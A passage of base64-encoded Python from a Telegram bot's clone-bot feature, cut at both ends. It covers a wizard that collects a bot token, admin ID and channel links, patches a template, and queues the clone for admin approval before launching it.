yJuIl0pKS5lbmNvZGUoKSwgc3R5bGU9ImRhbmdlciIsIGljb249cmJfaWNvbigpKV1dKQogICAgICAgIGQgPSBfY2x6X2xvYWQoKQogICAgICAgIGUgPSBkLmdldChzdHIodWlkKSwgW10pW2VudHJ5WyJuIl1dCiAgICAgICAgZVsic3RhdHVzIl0gPSAicGVuZGluZ19hcHByb3ZhbCIKICAgICAgICBlWyJtc2dfY2hhdCJdID0gZ2lkCiAgICAgICAgZVsibXNnX2lkIl0gPSBtc2cuaWQKICAgICAgICBfY2x6X3NhdmUoZCkKICAgICAgICByZXR1cm4gVHJ1ZQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KCJbQ0xaXSBncm91cCBzZW5kIGZhaWw6IiwgZSkKICAgICAgICByZXR1cm4gRmFsc2UKCiMgLS0tLS0tLS0tLSBCVUlMRCArIFNVQk1JVCAtLS0tLS0tLS0tCgphc3luYyBkZWYgX2Nsel9zdWJtaXQodWlkKToKICAgIHcgPSBfY2x6X3dpei5wb3AodWlkLCBOb25lKQogICAgaWYgbm90IHc6CiAgICAgICAgcmV0dXJuCiAgICBraW5kID0gdy5nZXQoImtpbmQiKQogICAgdG9rZW4gPSB3LmdldCgidG9rZW4iKQogICAgYWRtaW4gPSBpbnQody5nZXQoImFkbWluIikpCiAgICBjaDEgPSB3LmdldCgiY2gxIikKICAgIGwyID0gdy5nZXQoImwyIikKICAgIGwzID0gdy5nZXQoImwzIikKICAgIGdlbiA9IDEgaWYgX0NMWl9NQVJLRVIuZ2V0KCJraW5kIikgPT0gIm1haW4iIGVsc2UgaW50KF9DTFpfTUFSS0VSLmdldCgiZ2VuIiwgMSkpICsgMQogICAgbmV3X3Nlc3MgPSAiY2xvbmVfJWRfJWQiICUgKGFkbWluLCBpbnQodGltZS50aW1lKCkpICUgMTAwMDAwMDAwKQogICAgbWFya2VyID0geyJraW5kIjoga2luZCwgImNoMSI6IGNoMSwgImwyIjogbDIsICJsMyI6IGwzLCAiYWRtaW4iOiBhZG1pbiwgInRva2VuIjogdG9rZW4sICJzZXNzIjogbmV3X3Nlc3MsICJnZW4iOiBnZW59CiAgICB0cnk6CiAgICAgICAgdHBsID0gX2Nsel90cGxfc3JjKGtpbmQpCiAgICAgICAgaWYga2luZCA9PSAicHJlbWl1bSI6CiAgICAgICAgICAgIG91dCA9IF9jbHpfcGF0Y2hfcHJlbWl1bSh0cGwsIHRva2VuLCBhZG1pbiwgY2gxLCBsMiwgbDMsIG1hcmtlcikKICAgICAgICBlbHNlOgogICAgICAgICAgICBvdXQgPSBfY2x6X3BhdGNoX25wX3BsYWluKHRwbCwgdG9rZW4sIGFkbWluLCBjaDEsIGwyLCBsMywgbWFya2VyKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KCJbQ0xaXSBidWlsZCBmYWlsOiIsIGUpCiAgICAgICAgdHJ5OgogICAgICAgICAgICBhd2FpdCBfY2x6X3NtKCkodWlkLCBwcmVtaXVtX2Vtb2ppKCJcdTI3NGMgPGI+XHUxZDA1XHUxZDFjXHUwMjZhXHUwMjlmXHUxZDA1IFx1YTczMFx1MWQwMFx1MDI2YVx1MDI5Zjo8L2I+ICVzIiAlIHN0cihlKVs6ODBdKSwgcGFyc2VfbW9kZT0iaHRtbCIpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgcGFzcwogICAgICAgIHJldHVybgogICAgdHJ5OgogICAgICAgIG9zLm1ha2VkaXJzKF9jbHpfcChDTFpfRElSKSwgZXhpc3Rfb2s9VHJ1ZSkKICAgICAgICBwYXRoID0gX2Nsel9wKCIlcy9jbHpfJXNfJWQucHkiICUgKENMWl9ESVIsIHVpZCwgaW50KHRpbWUudGltZSgpKSkpCiAgICAgICAgd2l0aCBvcGVuKHBhdGgsICJ3IiwgZW5jb2Rpbmc9InV0Zi04IikgYXMgZjoKICAgICAgICAgICAgZi53cml0ZShvdXQpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoIltDTFpdIGZpbGUgd3JpdGUgZmFpbDoiLCBlKQogICAgICAgIHJldHVybgogICAgZCA9IF9jbHpfbG9hZCgpCiAgICBsc3QgPSBkLmdldChzdHIodWlkKSwgW10pCiAgICBuID0gbGVuKGxzdCkKICAgIGVudHJ5ID0geyJuIjogbiwgImtpbmQiOiBraW5kLCAidG9rZW4iOiB0b2tlbiwgImFkbWluIjogYWRtaW4sICJjaDEiOiBjaDEsICJsMiI6IGwyLCAibDMiOiBsMywKICAgICAgICAgICAgICJnZW4iOiBnZW4sICJmaWxlIjogcGF0aCwgInN0YXR1cyI6ICJwZW5kaW5nX2FwcHJvdmFsIiwgImNyZWF0ZWQiOiBpbnQodGltZS50aW1lKCkpLAogICAgICAgICAgICAgImV4cGlyZV9hdCI6IE5vbmUsICJwbGFuIjogImZyZWUiIGlmIG5vdCBpc19wcmVtaXVtKHVpZCkgZWxzZSAicHJlbSIsCiAgICAgICAgICAgICAicGlkIjogTm9uZSwgIm1zZ19jaGF0IjogTm9uZSwgIm1zZ19pZCI6IE5vbmUsICJhc2tlZF9hdCI6IE5vbmV9CiAgICBpZiBub3QgX2Nsel9jZmcoKS5nZXQoImdyb3VwIik6CiAgICAgICAgZW50cnlbInN0YXR1cyJdID0gInBlbmRpbmdfZ3JvdXAiCiAgICBsc3QuYXBwZW5kKGVudHJ5KQogICAgZFtzdHIodWlkKV0gPSBsc3QKICAgIF9jbHpfc2F2ZShkKQogICAgc2VudCA9IEZhbHNlCiAgICBpZiBlbnRyeVsic3RhdHVzIl0gPT0gInBlbmRpbmdfYXBwcm92YWwiOgogICAgICAgIHNlbnQgPSBhd2FpdCBfY2x6X3NlbmRfZ3JvdXAodWlkLCBlbnRyeSkKICAgIGVsc2U6CiAgICAgICAgZW50cnlbInN0YXR1cyJdID0gInBlbmRpbmdfZ3JvdXAiCiAgICAgICAgX2Nsel9zYXZlKGQpCiAgICB0cnk6CiAgICAgICAgaWYgc2VudDoKICAgICAgICAgICAgYXdhaXQgX2Nsel9zbSgpKHVpZCwgcHJlbWl1bV9lbW9qaShDTFpfVFhUX09LKSwgcGFyc2VfbW9kZT0iaHRtbCIpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgYXdhaXQgX2Nsel9zbSgpKHVpZCwgcHJlbWl1bV9lbW9qaShDTFpfVFhUX1EpLCBwYXJzZV9tb2RlPSJodG1sIikKICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgcGFzcwoKIyAtLS0tLS0tLS0tIFdJWkFSRCBIQU5ETEVSUyAtLS0tLS0tLS0tCgphc3luYyBkZWYgX2Nsel9vcGVuX21lbnUoZXZlbnQpOgogICAgdWlkID0gZXZlbnQuc2VuZGVyX2lkCiAgICBfY2x6X3dpei5wb3AodWlkLCBOb25lKQogICAgbGltID0gX2Nsel9saW1pdF9tc2codWlkKQogICAgaWYgbGltOgogICAgICAgIGF3YWl0IGV2ZW50LmFuc3dlcihsaW0sIGFsZXJ0PVRydWUpCiAgICAgICAgcmV0dXJuCiAgICBpZiBfQ0xaX01BUktFUi5nZXQoImtpbmQiKSA9PSAibWFpbiI6CiAgICAgICAgX2Nsel93aXpbdWlkXSA9IHsic3RlcCI6ICJraW5kIiwgInRzIjogdGltZS50aW1lKCl9CiAgICAgICAgYXdhaXQgZXZlbnQuZWRpdChwcmVtaXVtX2Vtb2ppKENMWl9UWFRfVE9QKSwgcGFyc2VfbW9kZT0iaHRtbCIsIGJ1dHRvbnM9WwogICAgICAgICAgICBbQnV0dG9uLmlubGluZSgiXHUyYjUwIFx1MWQxOFx1MDI4MFx1MWQwN1x1MWQwZFx1MDI2YVx1MWQxY1x1MWQwZCBcdTFkMjJcdTFkMGZcdTFkMWIiLCBiImNsel9raW5kX3ByZW1pdW0iLCBzdHlsZT0icHJpbWFyeSIsIGljb249cmJfaWNvbigpKV0sCiAgICAgICAgICAgIFtCdXR0b24uaW5saW5lKCJcdTI2OTlcdWZlMGYgXHUwMjc0XHUxZDBmXHUwMjc0IFx1MWQxOFx1MDI4MFx1MWQwN1x1MWQwZFx1MDI2YVx1MWQxY1x1MWQwZCBcdTFkMjJcdTFkMGZcdTFkMWIiLCBiImNsel9raW5kX25wIiwgc3R5bGU9InByaW1hcnkiLCBpY29uPXJiX2ljb24oKSldLAogICAgICAgICAgICBbQnV0dG9uLmlubGluZSgiXFUwMDAxRjVDMyBcdTAyOGZcdTFkMGZcdTFkMWNcdTAyODAgXHUxZDA3XHUxZDBmXHUxZDFiXHUwMjhmIiwgYiJjbHpfbXlib3RzIiwgc3R5bGU9InByaW1hcnkiLCBpY29uPXJiX2ljb24oKSldLAogICAgICAgICAgICBbQnV0dG9uLmlubGluZSgiXHUyNzRjIFx1MWQwNFx1MWQwMFx1MDI3NFx1MWQwNFx1MWQwN1x1MDI5ZiIsIGIiY2x6X2NhbmNlbCIsIHN0eWxlPSJkYW5nZXIiLCBpY29uPXJiX2ljb24oKSldLAogICAgICAgIF0pCiAgICBlbHNlOgogICAgICAgIF9jbHpfd2l6W3VpZF0gPSB7InN0ZXAiOiAidG9rZW4iLCAia2luZCI6IF9DTFpfTUFSS0VSLmdldCgia2luZCIpLCAidHMiOiB0aW1lLnRpbWUoKX0KICAgICAgICBhd2FpdCBldmVudC5lZGl0KHByZW1pdW1fZW1vamkoQ0xaX1RYVF9UT0tFTiksIHBhcnNlX21vZGU9Imh0bWwiLCBidXR0b25zPVsKICAgICAgICAgICAgW0J1dHRvbi5pbmxpbmUoIlx1Mjc0YyBcdTFkMDRcdTFkMDBcdTAyNzRcdTFkMDRcdTFkMDdcdTAyOWYiLCBiImNsel9jYW5jZWwiLCBzdHlsZT0iZGFuZ2VyIiwgaWNvbj1yYl9pY29uKCkpXSwKICAgICAgICBdKQogICAgYXdhaXQgZXZlbnQuYW5zd2VyKCkKCmJvdC5hZGRfZXZlbnRfaGFuZGxlcihfY2x6X29wZW5fbWVudSwgZXZlbnRzLkNhbGxiYWNrUXVlcnkoZGF0YT1iImNsb25lX2JvdF9tZW51IikpCmJvdC5hZGRfZXZlbnRfaGFuZGxlcihfY2x6X29wZW5fbWVudSwgZXZlbnRzLkNhbGxiYWNrUXVlcnkoZGF0YT1iImFkbV9jbG9uZWJvdCIpKQoKQGJvdC5vbihldmVudHMuTmV3TWVzc2FnZSgpKQphc3luYyBkZWYgX2Nsel93aXpfY2F0Y2goZXZlbnQpOgogICAgdHJ5OgogICAgICAgIGlmIG5vdCBldmVudC5pc19wcml2YXRlOgogICAgICAgICAgICByZXR1cm4KICAgICAgICB1aWQgPSBldmVudC5zZW5kZXJfaWQKICAgICAgICB3ID0gX2Nsel93aXouZ2V0KHVpZCkKICAgICAgICBpZiBub3QgdzoKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgaWYgdGltZS50aW1lKCkgLSB3LmdldCgidHMiLCAwKSA+IDkwMDoKICAgICAgICAgICAgX2Nsel93aXoucG9wKHVpZCwgTm9uZSkKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgdHh0ID0gKGV2ZW50LnJhd190ZXh0IG9yICIiKS5zdHJpcCgpCiAgICAgICAgaWYgbm90IHR4dDoKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgaWYgdHh0LnN0YXJ0c3dpdGgoIi8iKToKICAgICAgICAgICAgaWYgdHh0Lmxvd2VyKCkuc3RhcnRzd2l0aCgiL2NhbmNlbCIpOgogICAgICAgICAgICAgICAgX2Nsel93aXoucG9wKHVpZCwgTm9uZSkKICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICBhd2FpdCBldmVudC5yZXBseShwcmVtaXVtX2Vtb2ppKCJcdTI3NGMgPGI+XHUxZDA0XHUwMjlmXHUxZDBmXHUwMjc0XHUxZDA3IFx1MWQyMVx1MDI2YVx1MWQyMlx1MWQwMFx1MDI4MFx1MWQwNSBcdTFkMDRcdTFkMDBcdTAyNzRcdTFkMDRcdTFkMDdcdTAyOWZcdTFkMDdcdTFkMDU8L2I+IiksIHBhcnNlX21vZGU9Imh0bWwiKQogICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgIHJldHVybgogICAgICAgIHdbInRzIl0gPSB0aW1lLnRpbWUoKQogICAgICAgIHN0ID0gdy5nZXQoInN0ZXAiKQogICAgICAgIGlmIHN0ID09ICJ0b2tlbiI6CiAgICAgICAgICAgIGlmIG5vdCByZS5tYXRjaChyIl5cZHs4LDEwfTpbQS1aYS16MC05X1wtXXszMCx9JCIsIHR4dCk6CiAgICAgICAgICAgICAgICBhd2FpdCBldmVudC5yZXBseShwcmVtaXVtX2Vtb2ppKENMWl9UWFRfQkFEKSwgcGFyc2VfbW9kZT0iaHRtbCIpCiAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgd1sidG9rZW4iXSA9IHR4dAogICAgICAgICAgICB3WyJzdGVwIl0gPSAiYWRtaW4iCiAgICAgICAgICAgIGF3YWl0IGV2ZW50LnJlcGx5KHByZW1pdW1fZW1vamkoQ0xaX1RYVF9BRE1JTiksIHBhcnNlX21vZGU9Imh0bWwiKQogICAgICAgIGVsaWYgc3QgPT0gImFkbWluIjoKICAgICAgICAgICAgaWYgbm90IHJlLm1hdGNoKHIiXlxkezQsMTJ9JCIsIHR4dCk6CiAgICAgICAgICAgICAgICBhd2FpdCBldmVudC5yZXBseShwcmVtaXVtX2Vtb2ppKENMWl9UWFRfQkFEKSwgcGFyc2VfbW9kZT0iaHRtbCIpCiAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgd1siYWRtaW4iXSA9IGludCh0eHQpCiAgICAgICAgICAgIHdbInN0ZXAiXSA9ICJjaDEiCiAgICAgICAgICAgIGF3YWl0IGV2ZW50LnJlcGx5KHByZW1pdW1fZW1vamkoQ0xaX1RYVF9DSDEpLCBwYXJzZV9tb2RlPSJodG1sIikKICAgICAgICBlbGlmIHN0ID09ICJjaDEiOgogICAgICAgICAgICB1ID0gX2Nsel9wYXJzZV91c2VyKHR4dCkKICAgICAgICAgICAgaWYgbm90IHU6CiAgICAgICAgICAgICAgICBhd2FpdCBldmVudC5yZXBseShwcmVtaXVtX2Vtb2ppKENMWl9UWFRfQkFEKSwgcGFyc2VfbW9kZT0iaHRtbCIpCiAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgd1siY2gxIl0gPSB1CiAgICAgICAgICAgIHdbInN0ZXAiXSA9ICJjaDIiCiAgICAgICAgICAgIGF3YWl0IGV2ZW50LnJlcGx5KHByZW1pdW1fZW1vamkoQ0xaX1RYVF9DSDIpLCBwYXJzZV9tb2RlPSJodG1sIikKICAgICAgICBlbGlmIHN0ID09ICJjaDIiOgogICAgICAgICAgICBsID0gX2Nsel9wYXJzZV9saW5rKHR4dCkKICAgICAgICAgICAgaWYgbm90IGw6CiAgICAgICAgICAgICAgICBhd2FpdCBldmVudC5yZXBseShwcmVtaXVtX2Vtb2ppKENMWl9UWFRfQkFEKSwgcGFyc2VfbW9kZT0iaHRtbCIpCiAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgd1sibDIiXSA9IGwKICAgICAgICAgICAgd1sic3RlcCJdID0gImNoMyIKICAgICAgICAgICAgYXdhaXQgZXZlbnQucmVwbHkocHJlbWl1bV9lbW9qaShDTFpfVFhUX0NIMyksIHBhcnNlX21vZGU9Imh0bWwiKQogICAgICAgIGVsaWYgc3QgPT0gImNoMyI6CiAgICAgICAgICAgIGwgPSBfY2x6X3BhcnNlX2xpbmsodHh0KQogICAgICAgICAgICBpZiBub3QgbDoKICAgICAgICAgICAgICAgIGF3YWl0IGV2ZW50LnJlcGx5KHByZW1pdW1fZW1vamkoQ0xaX1RYVF9CQUQpLCBwYXJzZV9tb2RlPSJodG1sIikKICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICB3WyJsMyJdID0gbAogICAgICAgICAgICB3WyJzdGVwIl0gPSAiY29uZmlybSIKICAgICAgICAgICAgYXdhaXQgZXZlbnQucmVwbHkocHJlbWl1bV9lbW9qaShfY2x6X2NvbmZpcm1fdHh0KHcpKSwgcGFyc2VfbW9kZT0iaHRtbCIsIGJ1dHRvbnM9WwogICAgICAgICAgICAgICAgW0J1dHRvbi5pbmxpbmUoIlx1MjcwNSBcdTFkMDRcdTFkMGZcdTAyNzRcdWE3MzBcdTAyNmFcdTAyODBcdTFkMGQgXHUxZDAwXHUwMjc0XHUxZDA1IFx1MDI5Zlx1MWQxY1x1MWQwNVx1MWQwZFx1MDI2YVx1MWQxYiIsIGIiY2x6X2dvIiwgc3R5bGU9InN1Y2Nlc3MiLCBpY29uPXJiX2ljb24oKSldLAogICAgICAgICAgICAgICAgW0J1dHRvbi5pbmxpbmUoIlx1Mjc0YyBcdTFkMDRcdTFkMDBcdTAyNzRcdTFkMDRcdTFkMDdcdTAyOWYiLCBiImNsel9jYW5jZWwiLCBzdHlsZT0iZGFuZ2VyIiwgaWNvbj1yYl9pY29uKCkpXSwKICAgICAgICAgICAgXSkKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludCgiW0NMWl0gd2l6IGVycjoiLCBlKQoKQGJvdC5vbihldmVudHMuQ2FsbGJhY2tRdWVyeShkYXRhPWxhbWJkYSBkOiBkLnN0YXJ0c3dpdGgoYiJjbHoiKSkpCmFzeW5jIGRlZiBfY2x6X2NiX2FsbChldmVudCk6CiAgICB0cnk6CiAgICAgICAgZCA9IChldmVudC5kYXRhIG9yIGIiIikuZGVjb2RlKCJ1dGYtOCIsICJyZXBsYWNlIikKICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgcmV0dXJuCiAgICB1aWQgPSBldmVudC5zZW5kZXJfaWQKICAgIGlmIGQgPT0gImNsel9jYW5jZWwiOgogICAgICAgIF9jbHpfd2l6LnBvcCh1aWQsIE5vbmUpCiAgICAgICAgdHJ5OgogICAgICAgICAgICBhd2FpdCBldmVudC5lZGl0KHByZW1pdW1fZW1vamkoIlx1Mjc0YyA8Yj5cdTFkMDRcdTAyOWZcdTFkMGZcdTAyNzRcdTFkMDcgXHUxZDIxXHUwMjZhXHUxZDIyXHUxZDAwXHUwMjgwXHUxZDA1IFx1MWQwNFx1MWQwMFx1MDI3NFx1MWQwNFx1MWQwN1x1MDI5Zlx1MWQwN1x1MWQwNTwvYj4iKSwgcGFyc2VfbW9kZT0iaHRtbCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnV0dG9ucz1bW0J1dHRvbi5pbmxpbmUoIlx1MmIwMCBcdTAyOWNcdTFkMGZcdTFkMGRcdTFkMDciLCBiImJhY2tfdG9fc3RhcnQiLCBzdHlsZT0icHJpbWFyeSIsIGljb249cmJfaWNvbigpKV1dKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHBhc3MKICAgICAgICBhd2FpdCBldmVudC5hbnN3ZXIoKQogICAgICAgIHJldHVybgogICAgaWYgZCBpbiAoImNsel9raW5kX3ByZW1pdW0iLCAiY2x6X2tpbmRfbnAiKToKICAgICAgICB3ID0gX2Nsel93aXouZ2V0KHVpZCkKICAgICAgICBpZiBub3QgdzoKICAgICAgICAgICAgYXdhaXQgZXZlbnQuYW5zd2VyKCJXaXphcmQgZXhwaXJlZCBcdTIwMTQgL3N0YXJ0IHNlIGRvYmFyYSBraG9sbyIsIGFsZXJ0PVRydWUpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIHdbImtpbmQiXSA9ICJwcmVtaXVtIiBpZiBkID09ICJjbHpfa2luZF9wcmVtaXVtIiBlbHNlICJub25wcmVtaXVtIgogICAgICAgIHdbInN0ZXAiXSA9ICJ0b2tlbiIKICAgICAgICB3WyJ0cyJdID0gdGltZS50aW1lKCkKICAgICAgICBhd2FpdCBldmVudC5lZGl0KHByZW1pdW1fZW1vamkoQ0xaX1RYVF9UT0tFTiksIHBhcnNlX21vZGU9Imh0bWwiLCBidXR0b25zPVsKICAgICAgICAgICAgW0J1dHRvbi5pbmxpbmUoIlx1Mjc0YyBcdTFkMDRcdTFkMDBcdTAyNzRcdTFkMDRcdTFkMDdcdTAyOWYiLCBiImNsel9jYW5jZWwiLCBzdHlsZT0iZGFuZ2VyIiwgaWNvbj1yYl9pY29uKCkpXSwKICAgICAgICBdKQogICAgICAgIGF3YWl0IGV2ZW50LmFuc3dlcigpCiAgICAgICAgcmV0dXJuCiAgICBpZiBkID09ICJjbHpfbXlib3RzIjoKICAgICAgICBkdGEgPSBfY2x6X2xvYWQoKQogICAgICAgIGxzdCA9IGR0YS5nZXQoc3RyKHVpZCksIFtdKQogICAgICAgIGlmIG5vdCBsc3Q6CiAgICAgICAgICAgIGF3YWl0IGV2ZW50LmFuc3dlcigiXHUyNmEwXHVmZTBmIEtvaSBjbG9uZSBib3QgbmFoaSBiYW5hISIsIGFsZXJ0PVRydWUpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGxpbmVzID0gWyI8Yj5cVTAwMDFGNUMzIFx1MDI4Zlx1MWQwZlx1MWQxY1x1MDI4MCBcdTFkMDdcdTFkMGZcdTFkMWJcdTAyOGY8L2I+XG4iXQogICAgICAgIGZvciBlIGluIGxzdDoKICAgICAgICAgICAgc3QgPSBlLmdldCgic3RhdHVzIiwgIj8iKQogICAgICAgICAgICBpZiBzdCA9PSAiYWN0aXZlIiBhbmQgX2Nsel9hbGl2ZShlLmdldCgicGlkIikpOgogICAgICAgICAgICAgICAgaWMgPSAiXHUyNzA1IgogICAgICAgICAgICBlbGlmIHN0ID09ICJwZW5kaW5nX2FwcHJvdmFsIjoKICAgICAgICAgICAgICAgIGljID0gIlx1MjNmMyIKICAgICAgICAgICAgZWxpZiBzdCBpbiAoInJlamVjdGVkIiwgImRlbGV0ZWQiKToKICAgICAgICAgICAgICAgIGljID0gIlx1Mjc0YyIKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGljID0gIlx1MjNlYiIKICAgICAgICAgICAga2QgPSBlLmdldCgia2luZCIsICI/IikudXBwZXIoKQogICAgICAgICAgICBleHAgPSBlLmdldCgiZXhwaXJlX2F0IikKICAgICAgICAgICAgbGVmdCA9ICgiIFx1MjAxNCAlZGggbGVmdCIgJSBtYXgoMCwgKGludChleHApIC0gaW50KHRpbWUudGltZSgpKSkgLy8gMzYwMCkpIGlmIGV4cCBlbHNlICIiCiAgICAgICAgICAgIGxpbmVzLmFwcGVuZCgiJXMgPGI+IyVzICVzPC9iPiBcdTIwMTQgJXMlc1xuXFUwMDAxRjUxNyBAJXMiICUgKGljLCBlLmdldCgibiIsICI/IiksIGtkLCBzdCwgbGVmdCwgKGUuZ2V0KCJjaDEiKSBvciAiPyIpLmxzdHJpcCgiQCIpKSkKICAgICAgICB0cnk6CiAgICAgICAgICAgIGF3YWl0IGV2ZW50LmVkaXQocHJlbWl1bV9lbW9qaSgiXG4iLmpvaW4obGluZXMpKSwgcGFyc2VfbW9kZT0iaHRtbCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnV0dG9ucz1bW0J1dHRvbi5pbmxpbmUoIlx1MmIwMCBcdTAyOWNcdTFkMGZcdTFkMjFcdTFkMDciLCBiImNsb25lX2JvdF9tZW51Iiwgc3R5bGU9InByaW1hcnkiLCBpY29uPXJiX2ljb24oKSldLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFtCdXR0b24uaW5saW5lKCJcdTI3NGMgXHUxZDA0XHUwMjUxXHUwMjc0XHUxZDA0XHUxZDA3XHUwMjlmIiwgYiJjbHpfY2FuY2VsIiwgc3R5bGU9ImRhbmdlciIsIGljb249cmJfaWNvbigpKV1dKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHBhc3MKICAgICAgICBhd2FpdCBldmVudC5hbnN3ZXIoKQogICAgICAgIHJldHVybgogICAgaWYgZCA9PSAiY2x6X2dvIjoKICAgICAgICB3ID0gX2Nsel93aXouZ2V0KHVpZCkKICAgICAgICBpZiBub3QgdyBvciB3LmdldCgic3RlcCIpICE9ICJjb25maXJtIjoKICAgICAgICAgICAgYXdhaXQgZXZlbnQuYW5zd2VyKCJXaXphcmQgZXhwaXJlZCBcdTIwMTQgL3N0YXJ0IHNlIGRvYmFyYSBraG9sbyIsIGFsZXJ0PVRydWUpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGF3YWl0IGV2ZW50LmFuc3dlcigpCiAgICAgICAgdHJ5OgogICAgICAgICAgICBhd2FpdCBldmVudC5lZGl0KHByZW1pdW1fZW1vamkoIlx1MjNmMyA8Yj5cdTFkMDBcdTFkMThcdTFkMThcdTFkMDdcdTFkMDBcdTFkMDUgXHUxZDA0XHUxZDBmXHUwMjc0XHUxZDA3Li4uPC9iPiIpLCBwYXJzZV9tb2RlPSJodG1sIikKICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICBwYXNzCiAgICAgICAgYXdhaXQgX2Nsel9zdWJtaXQodWlkKQogICAgICAgIHJldHVybgogICAgcGFydHMgPSBkLnNwbGl0KCJfIikKICAgIGlmIGxlbihwYXJ0cykgPT0gMyBhbmQgcGFydHNbMF0gaW4gKCJjbHphIiwgImNsenIiLCAiY2x6YyIsICJjbHpkIikgYW5kIHBhcnRzWzFdLmlzZGlnaXQoKSBhbmQgcGFydHNbMl0uaXNkaWdpdCgpOgogICAgICAgIGFjdCwgc3UsIG4gPSBwYXJ0c1swXSwgcGFydHNbMV0sIGludChwYXJ0c1syXSkKICAgICAgICBpZiBhY3QgaW4gKCJjbHphIiwgImNsenIiKSBhbmQgbm90IGlzX2FkbWluKGV2ZW50LnNlbmRlcl9pZCk6CiAgICAgICAgICAgIGF3YWl0IGV2ZW50LmFuc3dlcigiXHUyNzRjIFNpcmYgYWRtaW4hIiwgYWxlcnQ9VHJ1ZSkKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgaWYgYWN0IGluICgiY2x6YyIsICJjbHpkIikgYW5kIG5vdCBpc19hZG1pbihldmVudC5zZW5kZXJfaWQpOgogICAgICAgICAgICBhd2FpdCBldmVudC5hbnN3ZXIoIlx1Mjc0YyBTaXJmIGFkbWluISIsIGFsZXJ0PVRydWUpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGR0YSA9IF9jbHpfbG9hZCgpCiAgICAgICAgbHN0ID0gZHRhLmdldChzdSwgW10pCiAgICAgICAgZSA9IGxzdFtuXSBpZiBuIDwgbGVuKGxzdCkgZWxzZSBOb25lCiAgICAgICAgaWYgbm90IGU6CiAgICAgICAgICAgIGF3YWl0IGV2ZW50LmFuc3dlcigiRW50cnkgbm90IGZvdW5kIiwgYWxlcnQ9VHJ1ZSkKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgaWYgYWN0ID09ICJjbHphIjoKICAgICAgICAgICAgaWYgZS5nZXQoInN0YXR1cyIpICE9ICJwZW5kaW5nX2FwcHJvdmFsIjoKICAgICAgICAgICAgICAgIGF3YWl0IGV2ZW50LmFuc3dlcigiQWxyZWFkeSBwcm9jZXNzZWQiLCBhbGVydD1UcnVlKQogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgIGVbInN0YXR1cyJdID0gImFjdGl2ZSIKICAgICAgICAgICAgZVsiYXBwcm92ZWQiXSA9IGludCh0aW1lLnRpbWUoKSkKICAgICAgICAgICAgaWYgZS5nZXQoInBsYW4iKSA9PSAiZnJlZSI6CiAgICAgICAgICAgICAgICBlWyJleHBpcmVfYXQiXSA9IGludCh0aW1lLnRpbWUoKSkgKyBDTFpfRlJFRV9IT1VSUyAqIDM2MDAKICAgICAgICAgICAgZVsicGlkIl0gPSBfY2x6X3NwYXduKGVbImZpbGUiXSkKICAgICAgICAgICAgX2Nsel9zYXZlKGR0YSkKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgYXdhaXQgZXZlbnQuZWRpdChwcmVtaXVtX2Vtb2ppKCJcdTI3MDUgPGI+XHUxZDAwXHUxZDE4XHUxZDE4XHUwMjgwXHUxZDBmXHUwMjhiXHUxZDA3XHUxZDA1PC9iPiBcdTIwMTQgYm90IExJVkUhIFVzZXIga28gRE0ga2FyIGRpeWEuIiksIHBhcnNlX21vZGU9Imh0bWwiKQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBsaW0gPSAiMjQgaG91cnMgKGZyZWUgbGltaXQpIiBpZiBlLmdldCgicGxhbiIpID09ICJmcmVlIiBlbHNlICJqYWIgdGFrIHByZW1pdW0gcGxhbiBhY3RpdmUgaGUiCiAgICAgICAgICAgICAgICBhd2FpdCBfY2x6X3NtKCkoaW50KHN1KSwgcHJlbWl1bV9lbW9qaShDTFpfVFhUX0FQUFJPVkVEX0RNICUgKGUuZ2V0KCJraW5kIiwgIj8iKS51cHBlcigpLCBsaW0pKSwgcGFyc2VfbW9kZT0iaHRtbCIpCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGlmIGFjdCA9PSAiY2x6ciI6CiAgICAgICAgICAgIGlmIGUuZ2V0KCJzdGF0dXMiKSAhPSAicGVuZGluZ19hcHByb3ZhbCI6CiAgICAgICAgICAgICAgICBhd2FpdCBldmVudC5hbnN3ZXIoIkFscmVhZHkgcHJvY2Vzc2VkIiwgYWxlcnQ9VHJ1